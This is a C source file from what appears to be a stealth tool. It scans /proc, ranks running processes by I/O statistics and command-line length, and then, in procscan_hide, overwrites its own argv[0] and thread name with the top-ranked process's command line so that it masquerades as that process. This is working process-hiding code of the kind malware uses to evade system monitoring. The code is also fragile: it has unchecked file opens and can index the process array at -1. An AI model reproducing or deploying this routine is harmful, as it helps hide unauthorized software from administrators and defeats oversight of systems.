#include "includes/hiding.h"
#include "includes/msbuffer.h"

int compare_process_stats(const void *a, const void *b) {
    process_stats **a_stat = (process_stats **)a;
    process_stats **b_stat = (process_stats **)b;

    float res;
    float call_ratio_a, call_ratio_b;

    if ((*a_stat)->PID == 1)
        return 1;
    if ((*b_stat)->PID == 1)
        return -1;

    call_ratio_a = ((*a_stat)->rchar + (*a_stat)->wchar) /
                   fmax(((*a_stat)->syscr + (*a_stat)->syscw), 1.0);
    call_ratio_b = ((*b_stat)->rchar + (*b_stat)->wchar) /
                   fmax(((*b_stat)->syscr + (*b_stat)->syscw), 1.0);

    call_ratio_a += (strlen((*a_stat)->cmdline) * 2.5f);
    call_ratio_b += (strlen((*b_stat)->cmdline) * 2.5f);

    res = call_ratio_b - call_ratio_a;

    return (int)res;
}

char *read_file(const char *path) {
    char *databuf = (char*)malloc(DATA_BUFF_LEN);
    FILE *fd;

    memset(databuf, 0, DATA_BUFF_LEN);
    fd = fopen(path, "r");
    fread(databuf, DATA_BUFF_LEN, 1, fd);
    fclose(fd);
    return databuf;
}

process_stats **allocate_proc_stats() {
    DIR *proc_dir = opendir("/proc");
    struct dirent *ent;
    long proccount = 0;

    if (proc_dir == NULL) {
        perror("opendir(/proc)");
        return NULL;
    }
    while (ent = readdir(proc_dir)) {
        if (!isdigit((*ent->d_name)))
            continue;
        proccount++;
    }
    printf("Process count: %d\n", proccount);

    process_stats **processes = (process_stats **)malloc((proccount) * sizeof(process_stats *));
    printf("Allocating: [%ld B] for for process info\n",
           (proccount * sizeof(process_stats *)));

    closedir(proc_dir);
    return processes;
}

process_stats *parse_process_stats(struct dirent *ent) {

    process_stats *stats;
    char pathbuf[LINE];
    char *databuf, *token;
    FILE *fd;
    long tgid;

    if (!isdigit((*ent->d_name))) {
        return NULL;
    }

    tgid = strtol(ent->d_name, NULL, 10);

    memset(pathbuf, 0, LINE);
    snprintf(pathbuf, LINE, "/proc/%ld/cmdline", tgid);
    databuf = read_file(pathbuf);

    if (strlen(databuf) == 0) {
        return NULL;
    }

    // create the stats variable we will return later
    stats = (process_stats *)malloc(sizeof(process_stats));
    memset(stats, 0, sizeof(process_stats));

    stats->PID = tgid;
    strcpy(stats->cmdline, databuf);

    memset(pathbuf, 0, LINE);
    snprintf(pathbuf, LINE, "/proc/%ld/io", tgid);
    free(databuf); // gotta avoid those memory leaks
    databuf = read_file(pathbuf);
    sscanf(databuf, "rchar: %ld\n\
            wchar: %ld\
            syscr: %ld\
            syscw: %ld\
            read_bytes: %ld\
            write_bytes: %ld\
            cancelled_write_bytes: %ld",
           &(stats->rchar), &(stats->wchar), &(stats->syscr), &(stats->syscw),
           &(stats->read_bytes), &(stats->write_bytes),
           &(stats->cancelled_write_bytes));
    // sscanf(token, "IpExt: %ld %ld %ld %ld %ld %ld %ld %ld", &c0, &c1, &c2,
    // &c3, &c4, &c5, &(stats->read_bytes), &(stats->write_bytes)); printf("%ld,
    // %ld\n\n", stats->read_bytes, stats->write_bytes);

    memset(pathbuf, 0, LINE);
    // TODO: Keep going with the netstat parse

    return stats;
}

void print_process(process_stats *process) {
    printf("PID: %ld:\
        \n\tCMDLine: %s\
        \n\trchar: %ld\
        \n\twchar: %ld\
        \n\tsyscr: %ld\
        \n\tsyscw: %ld\
        \n\tread_bytes: %ld\
        \n\twrite_bytes: %ld\
        \n\tcancelled_write_bytes: %ld\
        \n\
        \n\n\n",
           process->PID, process->cmdline, process->rchar, process->wchar,
           process->syscr, process->syscw, process->read_bytes,
           process->write_bytes, process->cancelled_write_bytes);
}

int procscan_hide(char** argv) {

    DIR *proc_dir;
    struct dirent *ent;
    long procstored = 0;
    process_stats **processes;
    long OWN_PID = getpid();

    processes = allocate_proc_stats();

    proc_dir = opendir("/proc");
    if (proc_dir == NULL) {
        perror("opendir(/proc)");
        return 1;
    }

    if (processes == NULL) {
        return 0;
    }

    while (ent = readdir(proc_dir)) {
        process_stats *stats = parse_process_stats(ent);
        if (stats == NULL) {
            continue;
        }
        processes[procstored++] = stats;
    }
    closedir(proc_dir);

    qsort(processes, procstored, sizeof(process_stats *),
          compare_process_stats);

    int ownp_index = -1;
    for (int i = 0; i < procstored; i++) {
        if (processes[i]->PID == OWN_PID) {
            print_process(processes[i]);
            ownp_index = i;
            break;
        }
    }

    
    //msbuffer *namebuf = create_msbuffer();
    //fprintf_msbuffer(namebuf, "/proc/%ld", OWN_PID);
    
    char process_path[32];
    int i = 0;
    char name[16];
    memset(process_path, 0, 32);
    memset(name, 0, 16);
    snprintf(process_path, 32, "/proc/%ld/cmdline", processes[ownp_index]->PID);
    strncpy(name, processes[0]->cmdline, 16);
    name[15] = '\0';

    /* mask the process name */
    memset(argv[0], 0, strlen(argv[0]));
    strncpy(argv[0], processes[0]->cmdline, strlen(argv[0])); // set the command line to be the best choice process
    prctl(PR_SET_NAME, name, 0, 0);

    // FILE* cmdline_fp = fopen(process_path, "ab+");
    // fwrite(processes[0]->cmdline, 1, strlen(processes[0]->cmdline), cmdline_fp); 
    // fflush(cmdline_fp); 
    // fclose(cmdline_fp);

    // for (int i = 0; i < procstored; i++) {
    //     free(processes[i]);
    // }
    return 0;
}
